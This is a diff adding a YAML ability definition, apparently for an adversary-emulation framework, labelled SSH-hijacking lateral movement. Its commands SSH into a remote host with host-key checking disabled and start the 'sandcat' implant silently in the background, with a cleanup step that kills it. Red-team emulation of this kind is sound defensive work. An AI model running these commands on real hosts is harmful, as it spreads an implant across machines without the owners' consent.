@@ -1,0 +1,24 @@
+---
+
+- id: 10a9d979-e342-418a-a9b0-002c483e0fa6
+  name: Start 54ndc47
+  description: Copy 54ndc47 to remote host and start it
+  tactic: lateral-movement
+  technique:
+    attack_id: T1184
+    name: SSH Hijacking
+  platforms:
+    darwin:
+      sh:
+        command: |
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
+        payload: sandcat.go-linux
+    linux:
+      sh:
+        command: |
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'
+        payload: sandcat.go
